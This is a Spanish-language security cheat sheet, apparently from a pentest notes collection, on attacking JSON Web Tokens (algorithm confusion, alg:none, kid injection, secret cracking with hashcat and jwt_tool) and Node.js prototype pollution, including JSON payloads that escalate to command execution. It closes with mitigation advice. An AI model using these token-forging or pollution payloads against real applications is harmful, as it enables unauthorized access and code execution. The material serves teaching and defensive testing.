---
title: JWT y contaminación de prototipos en apps Node/JS
tags: [web, jwt, prototype-pollution, nodejs, rce]
---

# JWT y contaminación de prototipos

[🇬🇧 English](node-jwt-prototype.en.md) | **Español**

Dos fallos de confianza muy habituales en aplicaciones JavaScript: firmar tokens con el algoritmo equivocado y mezclar objetos sin sanear las claves.

## 1. Anatomía de un JWT

```text
header.payload.signature      base64url(header).base64url(payload).HMAC/RSA
```

```bash
echo '<header>'  | base64 -d
echo '<payload>' | base64 -d
```

El servidor debe verificar la firma **con el algoritmo que él decide**, no con el que trae el token.

## 2. Confusión de algoritmos (RS256 → HS256)

Si el backend hace `verify(token, publicKey)` sin fijar el algoritmo, acepta `alg: HS256` y usa la clave pública RSA como secreto HMAC. La clave pública es… pública.

```bash
# 1. obtener la clave pública (endpoint JWKS, .well-known, cert)
curl -s http://<HOST>/.well-known/jwks.json

# 2. firmar con HS256 usando el PEM público como secreto
python3 - <<'PY'
import jwt
pub = open('public.pem').read()
print(jwt.encode({'user':'admin','role':'admin'}, pub, algorithm='HS256'))
PY
```

Variantes: `alg: none` (servidores viejos), `kid` con path traversal o inyección, y secretos débiles:

```bash
hashcat -m 16500 token.txt /usr/share/wordlists/rockyou.txt
```

`jwt_tool` automatiza todo:

```bash
python3 jwt_tool.py '<token>' -T          # tamper
python3 jwt_tool.py '<token>' -C -d wordlist.txt
```

## 3. Contaminación de prototipos

Un `merge`/`extend` recursivo que copia claves sin filtrar `__proto__`, `constructor` o `prototype` modifica `Object.prototype` para todo el proceso:

```json
{"__proto__": {"isAdmin": true}}
{"constructor": {"prototype": {"isAdmin": true}}}
```

Detección: envía `?__proto__[x]=1` o un JSON anidado y observa si una propiedad que no existía aparece en respuestas de otros usuarios (o si un `if (user.isAdmin)` pasa).

De «es admin» a RCE: si el objeto contaminado llega a `child_process.spawn`/`execFile`, las opciones `shell`, `env`, `argv0` o `NODE_OPTIONS` se heredan del prototipo:

```json
{"__proto__": {"shell": "/bin/sh", "env": {"NODE_OPTIONS": "--require /proc/self/environ"}}}
```

Herramientas: `ppmap`, `nodejsscan`, y revisión manual de `lodash.merge`, `deep-extend`, `qs`, `express` y plantillas (EJS/Pug) con gadgets conocidos.

## 4. Errores típicos

- **`invalid signature` tras cambiar `alg`** → el servidor sí fija el algoritmo; busca `kid` o secreto débil.
- **`jwt.decode` sin verificar** → el fallo es del código, no del token: demuéstralo cambiando el payload sin tocar la firma.
- **`base64url` con `=`** → quita el padding antes de decodificar.
- **La contaminación no persiste** → el merge ocurre en otro proceso/worker o el objeto se clona después.
- **`__proto__` bloqueado** → prueba `constructor.prototype` o `prototype` según la librería.

## 5. Detección y mitigación

- Fijar `algorithms: ['RS256']` en la verificación y usar la clave pública solo para verificar.
- Rotar secretos HMAC y usar claves largas; nunca la clave pública como secreto.
- Rechazar `alg: none` y validar `kid` contra una lista.
- `Object.create(null)`, `Object.freeze(Object.prototype)` y filtros de claves (`__proto__`, `constructor`, `prototype`) en los merges.
- SAST para `jwt.verify(` sin `algorithms` y para merges recursivos.

MITRE: T1550, T1059, T1190.
